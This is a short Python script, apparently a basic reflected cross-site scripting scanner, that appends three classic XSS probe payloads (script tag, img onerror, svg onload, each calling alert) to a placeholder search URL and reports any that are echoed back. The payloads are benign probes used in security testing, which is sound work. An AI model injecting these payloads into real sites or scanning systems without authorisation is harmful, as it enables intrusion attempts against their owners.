import requests

def xss_scanner(url, payloads):
    for payload in payloads:
        response = requests.get(url + payload)
        if payload in response.text:
            print(f"XSS vulnerability found with payload: {payload}")

# Example usage
url = "https://example.com/search?query="
payloads = ["<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>", "<svg/onload=alert('XSS')>"]
xss_scanner(url, payloads)